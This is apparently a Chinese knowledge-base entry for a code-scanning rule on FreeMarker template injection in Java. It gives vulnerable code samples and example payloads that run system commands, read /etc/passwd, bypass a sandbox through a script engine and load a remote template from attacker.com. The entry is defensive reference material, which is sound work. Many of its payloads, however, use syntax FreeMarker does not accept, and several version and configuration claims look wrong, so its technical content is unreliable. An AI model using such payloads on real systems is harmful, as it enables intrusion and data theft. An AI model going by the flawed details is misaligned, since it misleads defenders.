# Java 语言 FreeMarker 模板注入漏洞（FreeMarker Template Injection, FTI）完整描述

> 规则 ID：`other_freemarker_ssti` · 类别：ssti · 关键 sink：putTemplate
> 说明：本条为语义知识（cypher 语义查询，不可直接挂 semgrep），下方「知识正文」为中文漏洞详解，
> 配合 fortify-kingdom-reference 的定级指南与各语言 sink 手册使用。


### Java 语言 FreeMarker 模板注入漏洞（FreeMarker Template Injection, FTI）完整描述
FreeMarker 是一款基于 Java 的模板引擎，核心功能是将模板文件（.ftl）与数据模型结合，生成动态文本（如 HTML、XML、JSON 等）。模板注入漏洞本质是**攻击者通过可控输入向 FreeMarker 模板中插入恶意指令**，使模板解析引擎执行非预期的代码/逻辑，最终导致敏感信息泄露、服务器端命令执行（RCE）、权限提升等严重后果。

该漏洞的核心成因是：开发者未对用户输入做严格校验/过滤，直接将用户可控数据拼接到 FreeMarker 模板内容、模板路径或模板参数中，导致攻击者可注入 FreeMarker 语法的恶意代码，被模板引擎解析执行。


## 一、FreeMarker 模板执行机制与漏洞基础
### 1. FreeMarker 核心语法特性
FreeMarker 模板支持两类关键语法，也是漏洞利用的核心：
- **插值语法**：`${表达式}` 或 `#{表达式}`（旧版），用于执行表达式并输出结果；
- **指令语法**：`<#指令名 参数=值>`（如 `<#assign>` 定义变量、`<#if>` 条件判断、`<#list>` 循环）；
- **内置对象/方法**：FreeMarker 暴露了大量内置对象（如 `Request`、`Session`、`Static`）和 Java 反射相关能力，攻击者可通过这些对象突破沙箱。

### 2. 漏洞触发的核心条件
- 模板内容可控：用户输入直接拼接到模板字符串/文件中（如动态生成模板内容）；
- 模板参数可控：用户输入作为模板的变量值传入，但变量未做隔离，可被解析为表达式；
- 模板路径可控：攻击者可控制加载的模板文件路径，加载恶意模板文件。


## 二、FreeMarker 模板注入的不同场景与利用方式
根据模板注入的位置、FreeMarker 版本、沙箱配置的不同，漏洞利用效果和方式分为以下几类：

### 场景1：基础插值注入（无沙箱/低版本）
#### 触发条件
开发者直接将用户输入拼接到模板字符串中，例如：
```java
// 危险代码：用户输入直接拼接到模板内容
String userInput = request.getParameter("name");
String templateContent = "Hello, ${userInput}! Welcome to ${" + userInput + "}";
Template template = new Template("dynamic", new StringReader(templateContent), configuration);
Writer out = new StringWriter();
template.process(dataModel, out);
```
#### 利用方式
攻击者构造 `userInput` 参数为恶意 FreeMarker 表达式，直接执行代码：
- 读取系统敏感信息：`${java.lang.System.getProperty("user.dir")}` → 输出服务器当前工作目录；
- 读取环境变量：`${java.lang.System.getenv("PATH")}`；
- 反射调用类方法：`${Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")}`（尝试执行系统命令）。

#### 特点
- 适用于 FreeMarker 2.3.30 以下版本（无严格沙箱）；
- 无需复杂绕过，直接通过插值语法执行 Java 代码。

### 场景2：参数注入（变量值被解析为表达式）
#### 触发条件
开发者将用户输入作为模板变量传入，但模板中对变量的引用未做“字符串转义”，导致变量值被解析为表达式。例如：
```java
// 危险代码：用户输入作为变量传入模板
String userInput = request.getParameter("content");
Map<String, Object> dataModel = new HashMap<>();
dataModel.put("content", userInput);
// 模板文件（test.ftl）内容：<div>${content}</div>
Template template = configuration.getTemplate("test.ftl");
template.process(dataModel, out);
```
#### 利用方式
若 FreeMarker 配置了 `interpolationSyntax=auto` 或未禁用表达式解析，攻击者可构造 `content` 参数为：
- 基础表达式：`content=${1+1}` → 输出 `2`；
- 反射调用：`content=${Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("ls")}`；
- 读取敏感数据：`content=${Request.getSession().getAttribute("userToken")}`。

#### 特点
- 变量本身被当作表达式解析，而非纯字符串；
- 常见于开发者误解 FreeMarker 变量解析规则，未对变量值做转义处理。

### 场景3：沙箱绕过（FreeMarker 2.3.30+）
#### 背景
FreeMarker 2.3.30 及以上版本默认启用安全沙箱，限制了对 `java.lang.Runtime`、`java.lang.ProcessBuilder` 等危险类的直接访问，同时禁用了部分反射方法。但沙箱仍存在绕过方式。

#### 触发条件
模板注入依然存在，只是直接调用危险类被拦截，需通过“间接调用”或“未被沙箱覆盖的类”绕过。

#### 典型绕过方式
1. **通过 `java.lang.ClassLoader` 加载恶意类**：
   ```freemarker
   ${Class.forName("java.lang.Class").getClassLoader().loadClass("com.example.MaliciousClass").newInstance()}
   ```
2. **通过 `java.io.File` 读取敏感文件**（沙箱未拦截文件读取）：
   ```freemarker
   ${new java.io.File("/etc/passwd").text}
   ```
3. **通过 `javax.script.ScriptEngineManager` 执行 JavaScript 代码**（间接执行系统命令）：
   ```freemarker
   ${new javax.script.ScriptEngineManager().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('whoami')")}
   ```
4. **利用 FreeMarker 内置对象的隐式调用**：
   ```freemarker
   ${Request.getServletContext().getAttribute("org.apache.tomcat.InstanceManager").newInstance("java.lang.Runtime").exec("ls")}
   ```

#### 特点
- 需利用 Java 生态的“旁路”类/方法，绕过沙箱规则；
- 依赖目标环境的类加载器、可用的脚本引擎（如 Nashorn）等；
- 不同应用服务器（Tomcat/Jetty/Resin）的绕过方式存在差异。

### 场景4：模板路径注入（文件包含型）
#### 触发条件
开发者通过用户输入动态拼接模板文件路径，例如：
```java
// 危险代码：用户输入控制模板路径
String templatePath = request.getParameter("template");
Template template = configuration.getTemplate(templatePath + ".ftl");
template.process(dataModel, out);
```
#### 利用方式
1. **路径遍历读取任意模板/文件**：
   攻击者构造 `templatePath=../../../../etc/passwd` → 尝试加载系统文件作为模板（若 FreeMarker 允许读取非 .ftl 文件）；
2. **加载恶意模板文件**：
   若目标服务器存在可写目录，攻击者先上传恶意 .ftl 文件，再通过路径注入加载该文件：
   ```
   templatePath=../../uploads/malicious
   ```
3. **远程模板加载（若配置允许）**：
   若 FreeMarker 配置了 `templateLoader` 为远程 URL 加载器，攻击者可构造：
   ```
   templatePath=http://attacker.com/malicious.ftl
   ```

#### 特点
- 属于“文件包含”类漏洞的变种，而非直接的表达式注入；
- 危害取决于模板路径的可控范围和文件读取权限。

### 场景5：指令注入（非插值语法）
#### 触发条件
用户输入被拼接到 FreeMarker 指令中（如 `<#assign>`、`<#if>`、`<#list>`），而非插值语法。例如：
```java
String userInput = request.getParameter("condition");
String templateContent = "<#if " + userInput + ">Welcome</#if>";
Template template = new Template("dynamic", new StringReader(templateContent), configuration);
```
#### 利用方式
攻击者构造 `condition` 参数为恶意表达式，利用指令执行逻辑：
- 赋值并执行代码：`condition=1=1 && Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("whoami")`；
- 循环执行恶意逻辑：`condition=1=1 <#list 1..10 as x>${Class.forName("java.lang.System").currentTimeMillis()}</#list>`；
- 定义恶意变量：`condition=1=1 <#assign cmd=Class.forName("java.lang.Runtime").getRuntime().exec("ls")>`。

#### 特点
- 利用 FreeMarker 指令的逻辑执行能力，而非单纯的插值输出；
- 指令注入的代码可能不直接输出结果，但会在后台执行（如命令执行、数据篡改）。

### 场景6：低权限注入（无 RCE，但信息泄露）
#### 触发条件
目标环境严格限制了 Java 代码执行权限（如 SecurityManager 拦截命令执行），或沙箱配置极严格，无法执行系统命令，但仍可读取敏感数据。

#### 利用方式
1. **读取 Web 上下文数据**：
   ```freemarker
   ${Request.getParameterMap()}  // 读取所有请求参数
   ${Session.getAttributeNames()} // 读取 Session 中所有属性名
   ${Application.getAttribute("jdbcUrl")} // 读取应用全局变量（如数据库连接信息）
   ```
2. **读取服务器环境信息**：
   ```freemarker
   ${java.lang.System.getProperty("java.version")} // Java 版本
   ${java.lang.System.getProperty("sun.boot.class.path")} // 类路径
   ${new java.io.File(".").getAbsolutePath()} // 当前路径
   ```
3. **遍历目录结构**：
   ```freemarker
   ${new java.io.File("/").listFiles()} // 列出根目录文件
   ```

#### 特点
- 无远程代码执行，但可泄露应用配置、用户凭证、服务器环境等敏感信息；
- 仍是高风险漏洞，可为后续攻击（如精准渗透、权限提升）提供关键信息。


## 三、漏洞影响范围与关键影响因素
### 1. 影响范围
- FreeMarker 所有版本（2.3.x 全系列），仅利用方式随版本/沙箱配置不同而变化；
- 所有使用 FreeMarker 作为模板引擎的 Java 应用（如 Spring Boot、Struts2、JFinal 等框架）。

### 2. 关键影响因素
- FreeMarker 版本：2.3.30 以下无默认沙箱，RCE 难度低；2.3.30+ 需沙箱绕过；
- 应用服务器类型：Tomcat/Jetty/Resin 等的类加载机制、内置对象不同，影响绕过方式；
- 安全配置：是否自定义沙箱规则、是否启用 SecurityManager、是否限制文件读取/执行权限；
- 输入校验：开发者是否对用户输入做了白名单过滤、转义处理（如 `StringEscapeUtils.escapeXml`）。

### 3. 典型危害
- 远程代码执行（RCE）：执行任意系统命令，控制服务器；
- 敏感信息泄露：读取数据库配置、用户凭证、系统文件；
- 数据篡改：修改模板输出内容，伪造页面、钓鱼；
- 权限提升：通过读取管理员 Session、执行高权限命令突破权限限制；
- 服务器横向移动：利用 RCE 权限访问内网其他主机。

综上，FreeMarker 模板注入的核心风险在于“模板解析引擎执行了攻击者可控的代码”，其利用效果取决于输入可控性、FreeMarker 配置、目标 Java 环境的类/方法可用性，是 Java 生态中典型的“代码注入”类高危漏洞。

